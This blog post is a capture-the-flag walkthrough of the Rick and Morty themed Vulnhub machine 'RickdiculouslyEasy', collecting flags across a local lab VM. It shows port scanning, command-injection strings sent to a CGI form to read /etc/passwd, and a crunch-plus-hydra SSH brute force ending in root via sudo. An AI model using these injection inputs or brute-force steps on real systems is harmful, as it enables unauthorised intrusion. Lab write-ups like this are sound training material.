---
layout:     post
title:      "Vulnhub.com - Rickdiculously Easy 1"
subtitle:   "Write-Up"
date:       2017-11-01 8:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---
With some time between lectures, I decided to try out some new machines from Vulnhub - in particular the one called **RickdiculouslyEasy** as it seems to be really fun.

{% highlight text %}
This is a fedora server vm, created with virtualbox.

It is a very simple Rick and Morty themed boot to root.

There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.

It's designed to be a beginner ctf, if you're new to pen testing, check it out!
{% endhighlight %}

<p>Author: <a href="https://www.vulnhub.com/author/luke,562/"><b>Luke</b></a></p>
<p>Download: <a href="https://download.vulnhub.com/rickdiculouslyeasy/RickdiculouslyEasy.zip"><b>RickdiculouslyEasy</b></a></p>

# Write-Up

Attacker: Kali Linux **10.0.2.4**


Victim: RickdiculouslyEasy **10.0.2.15**

As always let's start by scanning the machine using **nmap**. This time I'm going to let it run a little longer, as I know that there are often hidden ports outside the default port range of nmap.

{% highlight bash %}
root@kali:~# nmap -p- -v -sS -A -T4 10.0.2.15

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-01 05:24 EDT
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:24
Completed NSE at 05:24, 0.00s elapsed
Initiating NSE at 05:24
Completed NSE at 05:24, 0.00s elapsed
Initiating ARP Ping Scan at 05:24
Scanning 10.0.2.15 [1 port]
Completed ARP Ping Scan at 05:24, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:24
Completed Parallel DNS resolution of 1 host. at 05:24, 0.01s elapsed
Initiating SYN Stealth Scan at 05:24
Scanning 10.0.2.15 [65535 ports]
Discovered open port 22/tcp on 10.0.2.15
Discovered open port 21/tcp on 10.0.2.15
Discovered open port 80/tcp on 10.0.2.15
Discovered open port 60000/tcp on 10.0.2.15
Increasing send delay for 10.0.2.15 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.0.2.15 from 5 to 10 due to 23 out of 57 dropped probes since last increase.
SYN Stealth Scan Timing: About 11.24% done; ETC: 05:29 (0:04:05 remaining)
Discovered open port 9090/tcp on 10.0.2.15
SYN Stealth Scan Timing: About 13.29% done; ETC: 05:32 (0:06:38 remaining)
SYN Stealth Scan Timing: About 15.35% done; ETC: 05:34 (0:08:22 remaining)
SYN Stealth Scan Timing: About 17.42% done; ETC: 05:36 (0:09:34 remaining)
Warning: 10.0.2.15 giving up on port because retransmission cap hit (6).
SYN Stealth Scan Timing: About 19.23% done; ETC: 05:37 (0:10:34 remaining)
SYN Stealth Scan Timing: About 20.90% done; ETC: 05:39 (0:11:25 remaining)
SYN Stealth Scan Timing: About 25.49% done; ETC: 05:40 (0:12:11 remaining)
SYN Stealth Scan Timing: About 41.68% done; ETC: 05:44 (0:11:21 remaining)
Discovered open port 13337/tcp on 10.0.2.15
SYN Stealth Scan Timing: About 49.01% done; ETC: 05:44 (0:10:22 remaining)
SYN Stealth Scan Timing: About 55.69% done; ETC: 05:45 (0:09:19 remaining)
SYN Stealth Scan Timing: About 61.36% done; ETC: 05:45 (0:08:16 remaining)
SYN Stealth Scan Timing: About 66.72% done; ETC: 05:46 (0:07:11 remaining)
SYN Stealth Scan Timing: About 72.09% done; ETC: 05:46 (0:06:05 remaining)
SYN Stealth Scan Timing: About 77.51% done; ETC: 05:46 (0:04:57 remaining)
SYN Stealth Scan Timing: About 82.81% done; ETC: 05:46 (0:03:49 remaining)
SYN Stealth Scan Timing: About 88.12% done; ETC: 05:47 (0:02:40 remaining)
SYN Stealth Scan Timing: About 93.19% done; ETC: 05:47 (0:01:32 remaining)
Discovered open port 22222/tcp on 10.0.2.15
Completed SYN Stealth Scan at 05:50, 1569.31s elapsed (65535 total ports)
Initiating Service scan at 05:50
Scanning 7 services on 10.0.2.15
Completed Service scan at 05:50, 11.01s elapsed (7 services on 1 host)
Initiating OS detection (try #1) against 10.0.2.15
NSE: Script scanning 10.0.2.15.
Initiating NSE at 05:50
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 05:51, 30.28s elapsed
Initiating NSE at 05:51
Completed NSE at 05:51, 1.02s elapsed
Nmap scan report for 10.0.2.15
Host is up (0.00081s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22 05:10 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
| fingerprint-strings:
|   NULL:
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp  open  http    Cockpit web service
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://10.0.2.15:9090/
13337/tcp open  unknown
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (EdDSA)
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings:
|   NULL, ibm-db2:
|_    Welcome to Ricks half baked reverse shell...
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(NULL
SF:,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
SF:\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.60%I=7%D=11/1%Time=59F998FB%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
SF:\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20re
SF:verse\x20shell\.\.\.\n#\x20");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Uptime guess: 35.438 days (since Tue Sep 26 19:20:25 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 10.0.2.15

NSE: Script Post-scanning.
Initiating NSE at 05:51
Completed NSE at 05:51, 0.00s elapsed
Initiating NSE at 05:51
Completed NSE at 05:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1615.79 seconds
           Raw packets sent: 128763 (5.668MB) | Rcvd: 128754 (5.153MB)

{% endhighlight %}

And together with the results of this comprehensive scan, we get the first flag!

{% highlight text%}
FLAG:{TheyFoundMyBackDoorMorty}-10Points
{% endhighlight %}

Now let's take a look at all the services more closely. Firstly, we can check **ftp** using anonymous login.

{% highlight bash %}
root@kali:~# ftp 10.0.2.15
Connected to 10.0.2.15.
220 (vsFTPd 3.0.3)
Name (10.0.2.15:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              33 Aug 22 05:10 .
drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
-rw-r--r--    1 0        0              42 Aug 22 05:10 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
226 Transfer complete.
42 bytes received in 0.00 secs (21.4967 kB/s)
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Feb 12  2017 .
drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
{% endhighlight %}

That was easy, another flag is in our hands.
{% highlight text %}
FLAG{Whoa this is unexpected} - 10 Points
{% endhighlight %}

Next part would be **ssh** service running on port **21**.

{% highlight bash %}
root@kali:~# ssh 10.0.2.15
ssh_exchange_identification: Connection closed by remote host
{% endhighlight %}

But unfortunately it's not working so we can move to another port. Before scanning the website I decided to look at port **9090** which is **cockpit web service**.

{% highlight text %}
https://10.0.2.15:9090/
FLAG {There is no Zeus, in your face!} - 10 Points
{% endhighlight %}

Third flag! That's 30 points already gathered. Now we can move on to the website scanning.

![Main Website](/img/rickdiculouslyeasy/main_web.png){:class="img-responsive center-block"}

Now, as usuall, let's brute force this website using **dirbuster**.

{% highlight bash %}
root@kali:~# dirb http://10.0.2.15/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Nov  1 04:49:28 2017
URL_BASE: http://10.0.2.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.15/ ----
+ http://10.0.2.15/cgi-bin/ (CODE:403|SIZE:217)                                
+ http://10.0.2.15/index.html (CODE:200|SIZE:326)                              
==> DIRECTORY: http://10.0.2.15/passwords/                                     
+ http://10.0.2.15/robots.txt (CODE:200|SIZE:126)                              

---- Entering directory: http://10.0.2.15/passwords/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Wed Nov  1 04:49:31 2017
DOWNLOADED: 4612 - FOUND: 3
{% endhighlight %}

A few good hits, both looking very promising. I wonder what's hidden inside **passwords** directory.  

![Passwords](/img/rickdiculouslyeasy/passwords.png){:class="img-responsive center-block"}

Another flag!
{% highlight text %}
FLAG{Yeah d- just don't do it.} - 10 Points
{% endhighlight %}

And what is much better, we have a password hidden in the comment of **passwords.html** file. Let's keep it in mind.  

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
{% endhighlight %}

Another result of this scan was **robots.txt** file, which we can check now.

{% highlight text %}
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
{% endhighlight %}

Root shell console?


{% highlight html %}
http://10.0.2.15/cgi-bin/root_shell.cgi
<html><head><title>Root Shell
</title></head>
--UNDER CONSTRUCTION--
<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
<!--I'm sorry Morty. It's a bummer.-->
</html>
{% endhighlight %}

That's bad, it would have been so much easier. Now let's check the **tracertool**.

{% highlight text %}
http://10.0.2.15/cgi-bin/tracertool.cgi
";whoami;
apache
{% endhighlight %}

It's a form that is vulnerable to **command injection**. But as you can see, someone replaced the **cat** command with the ASCII art of actuall cat.

{% highlight text%}
";cat tracertool.cgi
                      _
                     | \
                     | |
                     | |
 |\                   | |
/, ~\                / /
X     `-.....-------./ /
~-. ~  ~              |
    \             /    |
    \  /_     ___\   /
    | /\ ~~~~~   \  |
    | | \        || |
    | |\ \       || )
    (_/ (_/      ((_/
{% endhighlight %}

Fortunately there are more commands allowing us to view text such as **more**.
{% highlight text %}
";more /etc/passwd;
::::::::::::::
/etc/passwd
::::::::::::::
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
{% endhighlight %}

I know that we have a password to one of these accounts, but to which one? Let's check it using the **ssh** port 22222.

{% highlight bash %}
root@kali:~# ssh -p 22222 Summer@10.0.2.15
Summer@10.0.2.15's password:
Last failed login: Wed Nov  1 21:17:04 AEDT 2017 from 10.0.2.4 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ whoami
Summer
{% endhighlight %}

It's working! Now we can take a look around the system.

{% highlight text %}
[Summer@localhost ~]$ ls -la
total 20
drwx------. 2 Summer Summer  99 Sep 15 11:49 .
drwxr-xr-x. 5 root   root    52 Aug 18 18:20 ..
-rw-------. 1 Summer Summer   1 Sep 15 11:51 .bash_history
-rw-r--r--. 1 Summer Summer  18 May 30 14:53 .bash_logout
-rw-r--r--. 1 Summer Summer 193 May 30 14:53 .bash_profile
-rw-r--r--. 1 Summer Summer 231 May 30 14:53 .bashrc
-rw-rw-r--. 1 Summer Summer  48 Aug 22 02:46 FLAG.txt
[Summer@localhost ~]$ more FLAG.txt
FLAG{Get off the high road Summer!} - 10 Points
{% endhighlight %}

Another flag, and that's **50pts** already. Almost half way through.

{% highlight bash %}
[Summer@localhost ~]$ cd ../
[Summer@localhost home]$ ls -la
total 0
drwxr-xr-x.  5 root        root         52 Aug 18 18:20 .
dr-xr-xr-x. 17 root        root        236 Aug 18 19:16 ..
drwxr-xr-x.  2 Morty       Morty       131 Sep 15 11:49 Morty
drwxr-xr-x.  4 RickSanchez RickSanchez 113 Sep 21 10:30 RickSanchez
drwx------.  2 Summer      Summer       99 Sep 15 11:49 Summer
[Summer@localhost home]$ ls -la Morty
total 64
drwxr-xr-x. 2 Morty Morty   131 Sep 15 11:49 .
drwxr-xr-x. 5 root  root     52 Aug 18 18:20 ..
-rw-------. 1 Morty Morty     1 Sep 15 11:51 .bash_history
-rw-r--r--. 1 Morty Morty    18 May 30 14:53 .bash_logout
-rw-r--r--. 1 Morty Morty   193 May 30 14:53 .bash_profile
-rw-r--r--. 1 Morty Morty   231 May 30 14:53 .bashrc
-rw-r--r--. 1 root  root  43145 Aug 22 03:04 Safe_Password.jpg
-rw-r--r--. 1 root  root    414 Aug 22 03:06 journal.txt.zip

[Summer@localhost home]$ ls -la RickSanchez
total 12
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 .
drwxr-xr-x. 5 root        root         52 Aug 18 18:20 ..
-rw-r--r--. 1 RickSanchez RickSanchez  18 May 30 14:53 .bash_logout
-rw-r--r--. 1 RickSanchez RickSanchez 193 May 30 14:53 .bash_profile
-rw-r--r--. 1 RickSanchez RickSanchez 231 May 30 14:53 .bashrc
drwxr-xr-x. 2 RickSanchez RickSanchez  18 Sep 21 09:50 RICKS_SAFE
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 ThisDoesntContainAnyFlags
{% endhighlight %}

That's what we want to investigate now, contents of both Rick and Morty home directories. Let's start with **Morty**.

{% highlight bash %}
root@kali:~# scp -P 22222 Summer@10.0.2.15:/home/Morty/Safe_Password.jpg ~
Summer@10.0.2.15's password:
Safe_Password.jpg                             100%   42KB  10.8MB/s   00:00
root@kali:~# scp -P 22222 Summer@10.0.2.15:/home/Morty/journal.txt.zip ~
Summer@10.0.2.15's password:
journal.txt.zip                               100%  414   241.4KB/s   00:00
{% endhighlight%}

After copying files using **scp**, we can safely investigate them on our machine. Unfortuntely zip file is password protected.

{% highlight bash %}
root@kali:~# unzip journal.txt.zip
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password:
password incorrect--reenter:
password incorrect--reenter:
   skipping: journal.txt             incorrect password
   root@kali:~# strings Safe_Password.jpg
   JFIF
   Exif
   8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
   8BIM
   8BIM
   $3br
   %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
   	#3R
   &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
   0D000D\DDDD\t\\\\\t
{% endhighlight %}

Which was revealed by using **string** command. Now we can unzip it.

{% highlight text %}
root@kali:~# unzip journal.txt.zip
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password:
  inflating: journal.txt             
root@kali:~# cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points
{% endhighlight %}

Another flag that brings us to **70pts**. And a password to the safe!

{% highlight bash %}
root@kali:~# scp -P 22222 Summer@10.0.2.15:/home/RickSanchez/RICKS_SAFE/safe ~
Summer@10.0.2.15's password:
safe                                          100% 8704     2.8MB/s   00:00
root@kali:~# binwalk safe

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)
{% endhighlight %}

This file was indentified by **binwalk** as an executable. Let's run it.

{% highlight bash %}
root@kali:~# ./safe
./safe: error while loading shared libraries: libmcrypt.so.4: cannot open shared object file: No such file or directory
{% endhighlight %}

But firstly, we have to install mcrypt library.

{% highlight bash %}
root@kali:~# ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
{% endhighlight %}

Now we're ready to go and run the program with proper argument.

{% highlight bash %}
root@kali:~# ./safe 131333
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@
{% endhighlight %}

Another flag, summing up to **90pts**, together with a clue to the Rick's password.

Firsly we know that Rick played in band called "The Flesh Curtains", so we can extract each of the word into a different password combination. To make wordlists simpler and smaller, I decided to firstly create a list maching this pattern - A-Z:0-9:<one of the 3 words>.

{% highlight bash %}
root@kali:~# crunch 5 5 -t ,%The > rick.txt
Crunch will now generate the following amount of data: 1560 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@kali:~# crunch 7 7 -t ,%Flesh >> rick.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@kali:~# crunch 10 10 -t ,%Curtains >> rick.txt
Crunch will now generate the following amount of data: 2860 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
{% endhighlight %}

Now we can run **hydra** and crack the password.

{% highlight bash %}
root@kali:~# hydra -l RickSanchez -P rick.txt ssh://10.0.2.15 -s 22222
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-11-01 07:54:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 780 login tries (l:1/p:780), ~49 tries per task
[DATA] attacking ssh://10.0.2.15:22222/
[22222][ssh] host: 10.0.2.15   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-11-01 07:55:24
{% endhighlight %}

Got it! **P7Curtains** is the password, so we can now log in once again.

{% highlight bash %}
root@kali:~# ssh -p 22222 RickSanchez@10.0.2.15
RickSanchez@10.0.2.15's password:
Permission denied, please try again.
RickSanchez@10.0.2.15's password:
Last failed login: Wed Nov  1 22:57:05 AEDT 2017 from 10.0.2.4 on ssh:notty
There were 272 failed login attempts since the last successful login.
Last login: Thu Sep 21 09:45:24 2017
[RickSanchez@localhost ~]$
{% endhighlight %}

Another directory was just a troll.

{% highlight bash %}
[RickSanchez@localhost ~]$ cd ThisDoesntContainAnyFlags/
[RickSanchez@localhost ThisDoesntContainAnyFlags]$ ls -la
total 4
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 .
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 ..
-rw-rw-r--. 1 RickSanchez RickSanchez  95 Aug 18 20:26 NotAFlag.txt
[RickSanchez@localhost ThisDoesntContainAnyFlags]$ more NotAFlag.txt
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
But seriously this isn't a flag..
{% endhighlight %}

Wait, we can use **sudo** with Rick's password to log in as **root**. That's awesome.

{% highlight bash %}
[RickSanchez@localhost ~]$ sudo su
[sudo] password for RickSanchez:
[root@localhost RickSanchez]# cd ~
[root@localhost ~]# ls -la
total 36
dr-xr-x---.  4 root root  191 Aug 25 14:30 .
dr-xr-xr-x. 17 root root  236 Aug 18 19:16 ..
-rw-------.  1 root root   18 Nov  1 23:02 .bash_history
-rw-r--r--.  1 root root   18 Feb 12  2017 .bash_logout
-rw-r--r--.  1 root root  176 Feb 12  2017 .bash_profile
-rw-r--r--.  1 root root  176 Feb 12  2017 .bashrc
-rw-r--r--.  1 root root  100 Feb 12  2017 .cshrc
-rw-------.  1 root root   32 Aug 22 10:16 .lesshst
drwxr-----.  3 root root   19 Aug 21 17:35 .pki
drwx------.  2 root root   25 Aug 22 08:21 .ssh
-rw-r--r--.  1 root root  129 Feb 12  2017 .tcshrc
-rw-r--r--.  1 root root   40 Aug 22 07:37 FLAG.txt
-rw-------.  1 root root 1214 Aug 18 18:16 anaconda-ks.cfg
[root@localhost ~]# more FLAG.txt
FLAG: {Ionic Defibrillator} - 30 points
{% endhighlight %}

Here's another flag, giving us a total of **120pts**. Where are the last 20? Probably port 60000, as we never checked what's inside.

{% highlight bash %}
root@kali:~# telnet 10.0.2.15 60000
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.
Welcome to Ricks half baked reverse shell...
# ls -la
FLAG.txt
# more FLAG.txt
: command not found
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points
{% endhighlight %}

And there was the last flag - **130/130pts**.
